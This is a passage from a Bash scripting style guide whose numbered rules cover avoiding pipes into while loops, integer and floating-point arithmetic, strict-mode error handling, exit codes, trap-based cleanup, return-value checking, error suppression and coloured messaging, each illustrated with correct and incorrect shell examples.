**Avoid piping commands to while loops because pipes create subshells where variable assignments don't persist outside the loop. Use process substitution `< <(command)` or `readarray` instead.**

**Rationale:**
- Pipes create subshells; variables modified inside don't persist (counters stay 0, arrays stay empty)
- Silent failure with no error messages - script continues with wrong values
- Process substitution `< <(command)` runs loop in current shell, variables persist
- `readarray` is cleaner and faster for simple line collection
- Failures in piped commands may not trigger `set -e` properly

**The subshell problem:**

```bash
# ✗ WRONG - Subshell loses variable changes
declare -i count=0

echo -e "line1\nline2\nline3" | while IFS= read -r line; do
  echo "$line"
  count+=1
done

echo "Count: $count"  # Output: Count: 0 (NOT 3!)
```

**Solution 1: Process substitution (most common)**

```bash
# ✓ CORRECT - Process substitution avoids subshell
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done < <(echo -e "line1\nline2\nline3")

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**Solution 2: Readarray/mapfile (when collecting lines)**

```bash
# ✓ CORRECT - readarray reads all lines into array
declare -a lines

readarray -t lines < <(echo -e "line1\nline2\nline3")

declare -i count="${#lines[@]}"
echo "Count: $count"  # Output: Count: 3 (correct!)

local -- line
for line in "${lines[@]}"; do
  echo "$line"
done
```

**Solution 3: Here-string (for single variables)**

```bash
# ✓ CORRECT - Here-string when input is in variable
declare -- input=$'line1\nline2\nline3'
declare -i count=0

while IFS= read -r line; do
  echo "$line"
  count+=1
done <<< "$input"

echo "Count: $count"  # Output: Count: 3 (correct!)
```

**When readarray is better:**

```bash
# ✓ BEST - readarray for simple line collection
declare -a log_lines
readarray -t log_lines < <(tail -n 100 /var/log/app.log)

local -- line
for line in "${log_lines[@]}"; do
  [[ "$line" =~ ERROR ]] && echo "Error: ${line@Q}" ||:
done

# ✓ BEST - readarray with null-delimited input (handles spaces in filenames)
declare -a files
readarray -d '' -t files < <(find /data -type f -print0)

local -- file
for file in "${files[@]}"; do
  echo "Processing: $file"
done
```

**Anti-patterns to avoid:**

```bash
declare -i count=0
# ✗ WRONG - Pipe to while with counter
cat file.txt | while read -r line; do
  count+=1
done
echo "$count"  # Still 0!

# ✓ CORRECT - Process substitution
while read -r line; do
  count+=1
done < <(cat file.txt)
echo "$count"  # Correct!

# ✗ WRONG - Pipe to while building array
find /data -name '*.txt' | while read -r file; do
  files+=("$file")
done
echo "${#files[@]}"  # Still 0!

# ✓ CORRECT - readarray
readarray -d '' -t files < <(find /data -name '*.txt' -print0)
echo "${#files[@]}"  # Correct!

# ✗ WRONG - Setting flag in piped while
has_errors=0
grep ERROR log | while read -r line; do
  has_errors=1
done
echo "$has_errors"  # Still 0!

# ✓ CORRECT - Use return value
if grep -q ERROR log; then
  has_errors=1
fi
```

**Edge cases:**

**1. Empty input:**
```bash
declare -i count=0
while read -r line; do
  count+=1
done < <(echo -n "")  # No output
echo "Count: $count"  # 0 - correct (no lines)
```

**2. Very large output:**
```bash
# readarray loads everything into memory
readarray -t lines < <(cat huge_file)  # Might use lots of RAM

# Process substitution processes line by line - lower memory usage
while read -r line; do
  process "$line"
done < <(cat huge_file)
```

**3. Null-delimited input (filenames with newlines):**
```bash
while IFS= read -r -d '' file; do
  echo "File: $file"
done < <(find /data -print0)

# Or with readarray
readarray -d '' -t files < <(find /data -print0)
```

**Key principle:** Piping to while is a dangerous anti-pattern that silently loses variable modifications. Always use process substitution `< <(command)` or `readarray` instead. This is not a style preference - it's about correctness. If you find `| while read` in code, it's almost certainly a bug.


---


**Rule: BCS0505**

## Arithmetic Operations

> **See Also:** BCS0201 for integer variable declaration with `declare -i`

**Declare integer variables explicitly:**

```bash
declare -i i j result count total
declare -i counter=0
declare -i max_retries=3
```

**Rationale for `declare -i`:**
- Automatic arithmetic context (no `$(())` needed for assignments)
- Type safety catches non-numeric assignment errors
- Slightly faster for repeated operations
- Required for BCS compliance (BCS0201)

**Increment operations:**

```bash
# ✓ CORRECT - The ONLY acceptable increment form
declare -i i=0    # MUST declare as integer first
i+=1              # Clearest, safest, most readable

# ✗ WRONG - NEVER use these increment forms
((i+=1))          # NEVER - (()) is unnecessary
((i++))           # NEVER - fails with set -e when i=0
((++i))           # NEVER - unnecessary complexity
i++               # NEVER - syntax error outside arithmetic context
```

**Critical rule:** Use `i+=1` for ALL increments. Requires `declare -i` or `local -i` first.

**Why `((i++))` is dangerous:**

```bash
#!/usr/bin/env bash
set -e  # Exit on error

i=0
((i++))  # Returns 0 (the old value), which is "false"
         # Script exits here with set -e!

echo "This never executes"
```

**Arithmetic expressions:**

```bash
# In (()) - no $ needed for variables
((result = x * y + z))
((total = sum / count))

# With $(()), for assignments or commands
result=$((x * y + z))
echo "$((i * 2 + 5))"
```

**Arithmetic operators:**

| Operator | Meaning | Example |
|----------|---------|---------|
| `+` `-` `*` `/` `%` | Basic math | `((i = a + b))` |
| `**` | Exponentiation | `((i = a ** b))` |
| `+=` `-=` | Compound assignment | `i+=5` |
| `++` `--` | Increment/Decrement | Use `i+=1` instead |

**Arithmetic conditionals:**

```bash
if ((i < j)); then
  echo 'i is less than j'
fi

((count)) && process_items
((attempts >= max_retries)) && die 1 'Too many attempts'
```

**Comparison operators:** `<` `<=` `>` `>=` `==` `!=`

**Arithmetic truthiness:** Non-zero is truthy. Use directly instead of explicit comparisons:

```bash
# ✓ CORRECT - use truthiness directly
declare -i count=5
if ((count)); then echo 'Has items'; fi
((VERBOSE)) && echo 'Verbose mode enabled'

# ✗ WRONG - redundant comparison
if ((count > 0)); then echo 'Has items'; fi
if ((VERBOSE == 1)); then echo 'Verbose mode'; fi
```

**Complex expressions:**

```bash
((result = (a + b) * (c - d)))
((max = a > b ? a : b))           # Ternary (bash 5.2+)
((flags = flag1 | flag2))         # Bitwise OR
((masked = value & 0xFF))         # Bitwise AND
```

**Anti-pattern: Using [[ ]] for arithmetic:**

```bash
# ✗ WRONG - verbose, old-style
if [[ "$exit_code" -eq 0 ]]; then echo 'Success'; fi
[[ "$count" -gt 10 ]] && process_items

# ✓ CORRECT - clean arithmetic syntax
if ((exit_code == 0)); then echo 'Success'; fi
((count > 10)) && process_items ||:
```

**Why `(())` is better:** No quoting required, native operators (`>` vs `-gt`), more readable, faster (pure bash), type-safe.

**Other anti-patterns:**

```bash
# ✗ Wrong - expr command (slow, external)
result=$(expr $i + $j)
# ✓ Correct
result=$((i + j))

# ✗ Wrong - $ inside (())
((result = $i + $j))
# ✓ Correct
((result = i + j))

# ✗ Wrong - quotes around arithmetic
result="$((i + j))"
# ✓ Correct
result=$((i + j))
```

**Integer division:** Truncates toward zero. Use `bc` or `awk` for floating point:

```bash
((result = 10 / 3))                    # result=3
result=$(bc <<< "scale=2; 10 / 3")     # result=3.33
```

**Practical examples:**

```bash
# Loop counter
declare -i i
for ((i=0; i<10; i+=1)); do
  echo "Iteration $i"
done

# Retry logic
declare -i attempts=0 max_attempts=5
while ((attempts < max_attempts)); do
  process_item && break
  attempts+=1
  ((attempts > max_attempts)) || sleep 1
done
((attempts < max_attempts)) || die 1 'Max attempts reached'
```


---


**Rule: BCS0506**

## Floating-Point Operations

**Rule: BCS0706**

Bash only supports integer arithmetic natively. Use `bc` for arbitrary precision, `awk` for inline operations, `printf` for formatting.

---

#### Using bc

```bash
# Simple calculation
result=$(echo '3.14 * 2.5' | bc -l)

# With variables
declare -- width='10.5'
declare -- height='7.25'
area=$(echo "$width * $height" | bc -l)

# Set precision (scale)
pi=$(echo 'scale=10; 4*a(1)' | bc -l)  # Pi to 10 decimal places

# Comparison (bc returns 1 for true, 0 for false)
if (($(echo "$a > $b" | bc -l))); then
  info "$a is greater than $b"
fi
```

#### Using awk

```bash
# Inline calculation
result=$(awk "BEGIN {printf \"%.2f\", 3.14 * 2.5}")

# With variables
area=$(awk -v w="$width" -v h="$height" 'BEGIN {printf "%.2f", w * h}')

# Comparison
if awk -v a="$a" -v b="$b" 'BEGIN {exit !(a > b)}'; then
  info "$a is greater than $b"
fi

# Percentage calculation
pct=$(awk -v used="$used" -v total="$total" 'BEGIN {printf "%.1f", used/total*100}')
```

#### Using printf for Formatting

```bash
printf '%.2f\n' "$value"
printf 'Area: %.2f sq units\n' "$(echo "$w * $h" | bc -l)"
```

#### Common Patterns

```bash
# Human-readable byte sizes
bytes_to_human() {
  local -i bytes=$1
  if ((bytes >= 1073741824)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fG", b/1073741824}'
  elif ((bytes >= 1048576)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fM", b/1048576}'
  elif ((bytes >= 1024)); then
    awk -v b="$bytes" 'BEGIN {printf "%.1fK", b/1024}'
  else
    echo "${bytes}B"
  fi
}

# Percentage with rounding
calc_percentage() {
  local -i part=$1 total=$2
  awk -v p="$part" -v t="$total" 'BEGIN {printf "%.0f", p/t*100}'
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - Bash integer division loses precision
result=$((10 / 3))  # Returns 3, not 3.333

# ✓ Correct - use bc for float division
result=$(echo '10 / 3' | bc -l)  # Returns 3.333...

# ✗ Wrong - comparing floats as strings
if [[ "$a" > "$b" ]]; then  # String comparison!

# ✓ Correct - use bc or awk for numeric comparison
if (($(echo "$a > $b" | bc -l))); then
```

---

**See Also:** BCS0705 (Integer Arithmetic)

#fin


---


**Rule: BCS0600**

# Error Handling

This section establishes comprehensive error handling for robust scripts. It mandates `set -euo pipefail` (with strongly recommended `shopt -s inherit_errexit`) for automatic error detection, defines standard exit code conventions (0=success, 1=general error, 2=misuse, 5=IO error, 22=invalid argument), explains trap handling for cleanup operations, details return value checking patterns, and clarifies safe error suppression methods (`|| true`, `|| :`, conditional checks). Error handling must be configured before any other commands run.


---


**Rule: BCS0601**

## Exit on Error

```bash
set -euo pipefail
# -e: Exit on command failure
# -u: Exit on undefined variable
# -o pipefail: Exit on pipe failure
```

**Rationale:** Strict mode catches errors immediately, prevents cascading failures, makes scripts behave like compiled languages.

**Handling expected failures:**

```bash
# Allow specific command to fail
command_that_might_fail || true

# Capture exit code in conditional
if command_that_might_fail; then
  echo 'Success'
else
  echo 'Expected failure occurred'
fi

# Temporarily disable errexit
set +e
risky_command
set -e

# Check optional variable safely
if [[ -n "${OPTIONAL_VAR:-}" ]]; then
  echo "Variable is set: $OPTIONAL_VAR"
fi
```

**Critical gotcha - command substitution exits immediately:**

```bash
# ✗ Script exits here with set -e
result=$(failing_command)  # Never reaches next line

# ✓ Correct - disable errexit for this command
set +e
result=$(failing_command)
set -e

# ✓ Alternative - check in conditional
if result=$(failing_command); then
  echo "Command succeeded: $result"
fi
```

**When to disable:** Interactive scripts, scripts trying multiple approaches, cleanup operations. Re-enable immediately after.


---


**Rule: BCS0602**

## Exit Codes

**Standard implementation:**
```bash
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
die 0                    # Success (or use `exit 0`)
die 1                    # Exit 1 with no error message
die 1 'General error'    # General error
die 2 'Missing argument' # Missing argument
die 22 'Invalid option'  # Invalid argument
```

**Standard exit codes:**

| Code | Meaning | When to Use |
|------|---------|-------------|
| 0 | Success | Command completed successfully |
| 1 | General error | Catchall for general errors |
| 2 | Misuse of shell builtin | Missing keyword/command, permission denied |
| 22 | Invalid argument | Invalid option provided (EINVAL) |
| 126 | Command cannot execute | Permission problem or not executable |
| 127 | Command not found | Possible typo or PATH issue |
| 128+n | Fatal error signal n | e.g., 130 = Ctrl+C (128+SIGINT) |
| 255 | Exit status out of range | Use 0-255 only |

**Custom codes with constants:**
```bash
readonly -i SUCCESS=0
readonly -i ERR_GENERAL=1
readonly -i ERR_USAGE=2
readonly -i ERR_CONFIG=3
readonly -i ERR_NETWORK=4

die "$ERR_CONFIG" 'Failed to load configuration file'
die 22 "Invalid option ${1@Q}"  # Bad argument (EINVAL)
```

**Rationale:** 0=success (universal Unix convention), 1=general error (safe catchall), 2=usage error (matches bash built-in behavior), 22=EINVAL (standard errno). Use 1-125 for custom codes to avoid signal conflicts (128+n).

**Checking exit codes:**
```bash
if command; then
  echo 'Success'
else
  exit_code=$?
  case $exit_code in
    1) echo 'General failure' ;;
    2) echo 'Usage error' ;;
    *) echo "Unknown error: $exit_code" ;;
  esac
fi
```


---


**Rule: BCS0603**

## Trap Handling

**Standard cleanup pattern:**

```bash
cleanup() {
  local -i exitcode=${1:-0}

  # Disable trap during cleanup to prevent recursion
  trap - SIGINT SIGTERM EXIT

  # Cleanup operations
  [[ -n "$temp_dir" && -d "$temp_dir" ]] && rm -rf "$temp_dir"
  [[ -n "$lockfile" && -f "$lockfile" ]] && rm -f "$lockfile"

  # Log cleanup completion
  ((exitcode == 0)) && info 'Cleanup completed successfully' || warn "Cleanup after error (exit $exitcode)"

  exit "$exitcode"
}

# Install trap
trap 'cleanup $?' SIGINT SIGTERM EXIT
```

**Rationale:** Ensures temp files, locks, and processes are cleaned up on errors or signals. Preserves exit code via `$?`. Prevents partial state regardless of exit path.

**Signal reference:**

| Signal | When Triggered |
|--------|----------------|
| `EXIT` | Always on script exit (normal or error) |
| `SIGINT` | User presses Ctrl+C |
| `SIGTERM` | `kill` command (default signal) |
| `ERR` | Command fails (with `set -e`) |

**Common patterns:**

**Temp file/directory:**
```bash
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
```

**Lockfile:**
```bash
lockfile=/var/lock/myapp.lock

acquire_lock() {
  if [[ -f "$lockfile" ]]; then
    die 1 "Already running (lock file exists ${lockfile@Q})"
  fi
  echo $$ > "$lockfile" || die 1 "Failed to create lock file ${lockfile@Q}"
  trap 'rm -f "$lockfile"' EXIT
}
```

**Background process:**
```bash
long_running_command &
bg_pid=$!
trap 'kill $bg_pid 2>/dev/null' EXIT
```

**Comprehensive cleanup:**
```bash
#!/usr/bin/env bash
set -euo pipefail

declare -- temp_dir=''
declare -- lockfile=''
declare -i bg_pid=0

cleanup() {
  local -i exitcode=${1:-0}

  trap - SIGINT SIGTERM EXIT

  ((bg_pid)) && kill "$bg_pid" 2>/dev/null

  if [[ -n "$temp_dir" && -d "$temp_dir" ]]; then
    rm -rf "$temp_dir" || warn "Failed to remove temp directory: $temp_dir"
  fi

  if [[ -n "$lockfile" && -f "$lockfile" ]]; then
    rm -f "$lockfile" || warn "Failed to remove lockfile: $lockfile"
  fi

  if ((exitcode == 0)); then
    info 'Script completed successfully'
  else
    error "Script exited with error code: $exitcode"
  fi

  exit "$exitcode"
}

# Install trap EARLY (before creating resources)
trap 'cleanup $?' SIGINT SIGTERM EXIT

temp_dir=$(mktemp -d)
lockfile=/var/lock/myapp-"$$".lock
echo $$ > "$lockfile"

monitor_process &
bg_pid=$!

main "$@"
```

**Multiple traps:**
```bash
# ✗ This REPLACES the previous trap!
trap 'echo "Exiting..."' EXIT
trap 'rm -f "$temp_file"' EXIT

# ✓ Combine in one trap or use cleanup function
trap 'echo "Exiting..."; rm -f "$temp_file"' EXIT
```

**Execution order:** On Ctrl+C: SIGINT handler runs �' EXIT handler runs �' script exits.

**Disabling traps:**
```bash
trap - EXIT                    # Disable specific trap
trap - SIGINT                  # Ignore Ctrl+C during critical operation
perform_critical_operation
trap 'cleanup $?' SIGINT       # Re-enable
```

**Critical best practices:**

1. **Recursion prevention:** Disable trap first inside cleanup function
2. **Preserve exit code:** Use `trap 'cleanup $?' EXIT` - captures `$?` immediately
3. **Single quotes:** Delays variable expansion until trap fires
4. **Set trap early:** Before creating any resources

**Anti-patterns:**

```bash
# ✗ Wrong - not preserving exit code
trap 'rm -f "$temp_file"; exit 0' EXIT

# ✓ Correct
trap 'exitcode=$?; rm -f "$temp_file"; exit $exitcode' EXIT

# ✗ Wrong - double quotes expand now, not on trap
temp_file=/tmp/foo
trap "rm -f $temp_file" EXIT  # Expands immediately!
temp_file=/tmp/bar            # Trap still removes /tmp/foo!

# ✓ Correct - single quotes delay expansion
trap 'rm -f "$temp_file"' EXIT

# ✗ Wrong - resource before trap
temp_file=$(mktemp)
trap 'cleanup $?' EXIT  # Resource leaks if exit between lines!

# ✓ Correct - trap before resource
trap 'cleanup $?' EXIT
temp_file=$(mktemp)

# ✗ Wrong - complex logic inline
trap 'rm "$file1"; rm "$file2"; kill $pid; rm -rf "$dir"' EXIT

# ✓ Correct - use cleanup function
trap 'cleanup' EXIT
```

**Edge cases:**
- If cleanup fails, disabled trap prevents recursion - script still exits cleanly
- Trap fires for both error exits and normal exits with `EXIT` signal
- Test handlers with normal exit, `false` command, and Ctrl+C


---


**Rule: BCS0604**

## Checking Return Values

**Always check return values of commands and function calls with contextual error messages. While `set -e` helps, explicit checking gives better control.**

**Rationale:**
- Explicit checks enable contextual error messages and controlled recovery
- `set -e` doesn't catch: pipelines (except last), conditionals, command substitution in assignments
- Informative errors aid debugging and user experience

**When `set -e` fails:**

```bash
cat missing_file.txt | grep pattern  # Doesn't exit if cat fails!
if command_that_fails; then echo 'Runs anyway'; fi
output=$(failing_command)  # Doesn't exit!
```

**Return value checking patterns:**

```bash
# Pattern 1: Explicit if (most informative)
if ! mv "$source_file" "$dest_dir/"; then
  error "Failed to move ${source_file@Q} to ${dest_dir@Q}"
  exit 1
fi

# Pattern 2: || with die (concise)
mv "$source_file" "$dest_dir/" || die 1 "Failed to move ${source_file@Q}"

# Pattern 3: || with command group (for cleanup)
mv "$temp_file" "$final_location" || {
  error "Failed to move ${temp_file@Q} to ${final_location@Q}"
  rm -f "$temp_file"
  exit 1
}

# Pattern 4: Capture and check return code
wget "$url"
case $? in
  0) success "Download complete" ;;
  4) die 4 "Network failure" ;;
  *) die 1 "Unknown error: $?" ;;
esac

# Pattern 5: Function return value checking
validate_file() {
  local -- file=$1
  [[ -f "$file" ]] || return 2   # Not found
  [[ -r "$file" ]] || return 5   # Permission denied
  [[ -s "$file" ]] || return 22  # Invalid (empty)
  return 0
}

if validate_file "$config_file"; then
  source "$config_file"
else
  case $? in
    2)  die 2 "Config not found ${config_file@Q}" ;;
    5)  die 5 "Cannot read config ${config_file@Q}" ;;
    22) die 22 "Config empty ${config_file@Q}" ;;
  esac
fi
```

**Edge cases:**

```bash
# Pipelines - use PIPEFAIL or check PIPESTATUS
set -o pipefail
cat file1 | grep pattern | sort
if ((PIPESTATUS[0] != 0)); then die 1 'cat failed'; fi

# Command substitution - check after assignment
output=$(command_that_might_fail) || die 1 'Command failed'
# Or use: shopt -s inherit_errexit

# Conditional contexts - explicit check after
if some_command; then
  process_result
else
  die 1 'some_command failed'
fi
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
info() { echo "$SCRIPT_NAME: $*"; }

create_backup() {
  local -- source_dir=$1 backup_file=$2 temp_file

  [[ -d "$source_dir" ]] || { error "Source not found ${source_dir@Q}"; return 2; }
  [[ -w "${backup_file%/*}" ]] || { error "Cannot write to ${backup_file%/*}"; return 5; }

  temp_file="${backup_file}.tmp"

  if ! tar -czf "$temp_file" -C "${source_dir%/*}" "${source_dir##*/}"; then
    error 'Failed to create tar archive'
    rm -f "$temp_file"
    return 1
  fi

  if ! mv "$temp_file" "$backup_file"; then
    error 'Failed to move backup to final location'
    rm -f "$temp_file"
    return 1
  fi

  sha256sum "$backup_file" > "$backup_file".sha256 || true  # Non-fatal
  info "Backup created: $backup_file"
}

main() {
  local -a source_dirs=(/etc /var/log)
  local -- dir
  local -i fail_count=0

  for dir in "${source_dirs[@]}"; do
    create_backup "$dir" /backup/"${dir##*/}".tar.gz || fail_count+=1
  done

  ((fail_count == 0)) || die 1 "Some backups failed ($fail_count)"
  info 'All backups completed'
}

main "$@"
#fin
```

**Anti-patterns:**

```bash
# ✗ Ignoring return values
mv "$file" "$dest"
# ✓ Check return value
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Checking $? too late
command1
command2
if (($?)); then  # Checks command2, not command1!
# ✓ Check immediately after each command

# ✗ Generic error message
mv "$file" "$dest" || die 1 'Move failed'
# ✓ Specific error with context
mv "$file" "$dest" || die 1 "Failed to move ${file@Q} to ${dest@Q}"

# ✗ Unchecked command substitution
checksum=$(sha256sum "$file")
# ✓ Check command substitution
checksum=$(sha256sum "$file") || die 1 "Checksum failed for ${file@Q}"

# ✗ No cleanup after failure
cp "$source" "$dest" || exit 1
# ✓ Cleanup on failure
cp "$source" "$dest" || { rm -f "$dest"; die 1 "Copy failed"; }

# ✗ Assuming set -e catches everything
output=$(failing_command)  # Doesn't exit!
# ✓ Explicit checks even with set -e
output=$(failing_command) || die 1 'Command failed'
```

**Key principles:**
- Use `set -euo pipefail` + `shopt -s inherit_errexit` as baseline
- Add explicit checks for critical operations
- Provide contextual error messages with variable values using `${var@Q}`
- Clean up on failure with `|| { cleanup; exit 1; }` pattern
- Use meaningful return codes (0=success, 2=not found, 5=permission, etc.)


---


**Rule: BCS0605**

## Error Suppression

**Only suppress errors when failure is expected, non-critical, and explicitly safe. Always document WHY.**

**Rationale:** Suppression masks bugs, creates silent failures, leaves systems in insecure states, makes debugging impossible, and indicates design problems requiring fixes.

### When Suppression IS Appropriate

**1. Command/file existence checks (failure expected):**
```bash
if command -v optional_tool >/dev/null 2>&1; then
  info 'optional_tool available'
fi

if [[ -f "$optional_config" ]]; then
  source "$optional_config"
fi
```

**2. Cleanup operations (may have nothing to clean):**
```bash
cleanup_temp_files() {
  # Suppress - temp files might not exist
  rm -f /tmp/myapp_* 2>/dev/null || true
  rmdir /tmp/myapp 2>/dev/null || true
}
```

**3. Idempotent operations:**
```bash
install -d "$target_dir" 2>/dev/null || true
id "$username" >/dev/null 2>&1 || useradd "$username"
```

### When Suppression is DANGEROUS

**Critical operations that MUST NOT be suppressed:**

```bash
# ✗ DANGEROUS - copy fails, script continues with missing file
cp "$important_config" "$destination" 2>/dev/null || true
# ✓ Correct
cp "$important_config" "$destination" || die 1 "Failed to copy config"

# ✗ DANGEROUS - data silently lost
process_data < input.txt > output.txt 2>/dev/null || true
# ✓ Correct
process_data < input.txt > output.txt || die 1 'Data processing failed'

# ✗ DANGEROUS - service not running
systemctl start myapp 2>/dev/null || true
# ✓ Correct
systemctl start myapp || die 1 'Failed to start myapp service'

# ✗ DANGEROUS - wrong permissions (security vulnerability)
chmod 600 "$private_key" 2>/dev/null || true
# ✓ Correct
chmod 600 "$private_key" || die 1 "Failed to secure ${private_key@Q}"

# ✗ DANGEROUS - missing dependency, later failures mysterious
command -v git >/dev/null 2>&1 || true
# ✓ Correct
command -v git >/dev/null 2>&1 || die 1 'git is required'
```

### Suppression Patterns

| Pattern | Effect | Use When |
|---------|--------|----------|
| `2>/dev/null` | Suppress stderr only | Error messages noisy but check return value |
| `\|\| true` | Ignore return code | Failure acceptable, continue execution |
| `2>/dev/null \|\| true` | Suppress both | Both messages and return code irrelevant |

**Always document suppression:**
```bash
# Rationale: Temp files may not exist, this is not an error
rm -f /tmp/myapp_* 2>/dev/null || true
```

**Conditional suppression:**
```bash
if ((DRY_RUN)); then
  actual_operation 2>/dev/null || true  # Expected to fail
else
  actual_operation || die 1 'Operation failed'
fi
```

### Anti-Patterns

```bash
# ✗ WRONG - suppressing without documented reason
some_command 2>/dev/null || true

# ✗ WRONG - suppressing ALL errors in function
process_files() {
  # ... many operations ...
} 2>/dev/null

# ✓ Correct - only suppress specific operations
process_files() {
  critical_operation || die 1 'Critical operation failed'
  optional_cleanup 2>/dev/null || true  # Only this suppressed
}

# ✗ WRONG - using set +e to suppress errors
set +e
critical_operation
set -e

# ✓ Correct - use || true for specific command
critical_operation || {
  error 'Operation failed but continuing'
  true
}

# ✗ WRONG - different handling for production vs development
if [[ "$ENV" == production ]]; then
  operation 2>/dev/null || true
else
  operation
fi
```

### Complete Example

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

declare -- CACHE_DIR="$HOME"/.cache/myapp

# Optional dependency - suppression OK
check_optional_tools() {
  if command -v md2ansi >/dev/null 2>&1; then
    declare -g -i HAS_MD2ANSI=1
  else
    declare -g -i HAS_MD2ANSI=0
  fi
}

# Required dependency - NO suppression
check_required_tools() {
  command -v jq >/dev/null 2>&1 || die 1 'jq is required'
}

# Idempotent creation - suppression OK, but verify
create_directories() {
  # Rationale: install -d is idempotent
  install -d "$CACHE_DIR" 2>/dev/null || true
  [[ -d "$CACHE_DIR" ]] || die 1 "Failed to create ${CACHE_DIR@Q}"
}

# Cleanup - suppression OK
cleanup_old_files() {
  # Rationale: files may not exist
  rm -f "$CACHE_DIR"/*.tmp 2>/dev/null || true
}

# Data processing - NO suppression
process_data() {
  local -- input_file=$1 output_file=$2
  jq '.data' < "$input_file" > "$output_file" || die 1 "Failed: ${input_file@Q}"
}

main() {
  check_required_tools
  check_optional_tools
  create_directories
  cleanup_old_files
  process_data input.json "$CACHE_DIR"/output.json
}

main "$@"

#fin
```

### Key Rules

- **Only suppress** when failure is expected, non-critical, and safe
- **Always document** WHY with comment above suppression
- **Never suppress** critical operations (data, security, required dependencies)
- **Verify after** suppressed operations when possible
- **Test without** suppression first to ensure correctness


---


**Rule: BCS0606**

## Conditional Declarations with Exit Code Handling

**Append `|| :` to arithmetic conditionals under `set -e` to prevent false conditions from triggering script exit.**

**Rationale:**
- `(())` returns exit code 0 (true) or 1 (false); `set -e` exits on non-zero
- `|| :` provides safe fallback—colon is a no-op returning 0
- Colon `:` preferred over `true`: traditional Unix idiom, 1 char, no PATH lookup

**The Problem:**

```bash
set -euo pipefail
declare -i complete=0

# ✗ DANGEROUS: Script exits when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m'
# (()) returns 1, && short-circuits, set -e terminates script
```

**The Solution:**

```bash
# ✓ SAFE: Script continues when complete=0
((complete)) && declare -g BLUE=$'\033[0;34m' || :
# || : triggers on false, returns 0, script continues
```

**Common Patterns:**

```bash
# Pattern 1: Conditional variable declaration
((complete)) && declare -g BLUE=$'\033[0;34m' MAGENTA=$'\033[0;35m' || :
((verbose)) && declare -p NC RED GREEN YELLOW || :

# Pattern 2: Nested conditionals
if ((color)); then
  declare -g NC=$'\033[0m' RED=$'\033[0;31m'
  ((complete)) && declare -g BLUE=$'\033[0;34m' || :
fi

# Pattern 3: Conditional block
((verbose)) && {
  declare -p NC RED GREEN
  ((complete)) && declare -p BLUE MAGENTA || :
} || :

# Pattern 4: Feature-gated actions
((VERBOSE)) && echo "Processing $file" || :
((DRY_RUN)) && echo "Would execute: $command" || :
((LOG_LEVEL >= 2)) && log_debug "Value: $var" || :
```

**When to Use:**
- Optional variable declarations based on feature flags
- Conditional exports: `((PRODUCTION)) && export PATH=/opt/app/bin:$PATH || :`
- Silent feature-gated actions, optional logging/debug output
- Tier-based variable sets (basic vs complete)

**When NOT to Use:**

```bash
# ✗ Don't suppress critical operations
((required_flag)) && critical_operation || :

# ✓ Check explicitly when action must succeed
if ((required_flag)); then
  critical_operation || die 1 'Critical operation failed'
fi

# ✗ Don't hide failures you need to know about
((condition)) && risky_operation || :

# ✓ Handle failure explicitly
if ((condition)) && ! risky_operation; then
  error 'risky_operation failed'
  return 1
fi
```

**Anti-Patterns:**

```bash
# ✗ No || :, script exits when condition false
((complete)) && declare -g BLUE=$'\033[0;34m'

# ✗ Double negative, less readable
((complete==0)) || declare -g BLUE=$'\033[0;34m'

# ✗ Verbose, less idiomatic (use : not true)
((complete)) && declare -g BLUE=$'\033[0;34m' || true

# ✗ Suppressing critical operation errors
((user_confirmed)) && delete_all_files || :
```

**Alternatives Comparison:**

| Alternative | Use When |
|-------------|----------|
| `if ((cond)); then ... fi` | Complex logic, multiple statements |
| `((cond)) && action \|\| :` | Simple conditional declaration |
| Disable errexit temporarily | Never—use `\|\| :` instead |

**Edge Cases:**

1. **Nested conditionals**: Each level needs its own `|| :`
   ```bash
   ((outer)) && { ((inner)) && action || :; } || :
   ```

2. **Action failure vs condition failure**: `|| :` only handles condition being false—if action fails, error propagates correctly

**Cross-reference:** BCS0705 (Arithmetic Operations), BCS0805 (Error Suppression), BCS0801 (Exit on Error)


---


**Rule: BCS0700**

# Input/Output & Messaging

Establishes standardized messaging patterns with color support and proper stream handling. Defines complete messaging suite: `_msg()` (core function using FUNCNAME), `vecho()` (verbose output), `success()`, `warn()`, `info()`, `debug()`, `error()` (unconditional to stderr), `die()` (exit with error), `yn()` (yes/no prompts). Covers STDOUT vs STDERR separation (data vs diagnostics), usage documentation patterns, and when to use messaging functions versus bare echo. Error output must use `>&2` at command beginning.


---


**Rule: BCS0701**

## Standardized Messaging and Color Support

```bash
# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Rationale:** Terminal detection via `-t 1 && -t 2` ensures colors only appear when both stdout and stderr are terminals, preventing ANSI codes in logs/pipes.

**Anti-patterns:**
```bash
# ✗ Unconditional colors (breaks pipes/logs)
declare -r RED=$'\033[0;31m'

# ✗ Missing NC reset
echo "${RED}Error"  # Terminal stays red
```


---


**Rule: BCS0702**

## STDOUT vs STDERR
- All error messages go to `STDERR`
- Place `>&2` at beginning for clarity

```bash
# Preferred
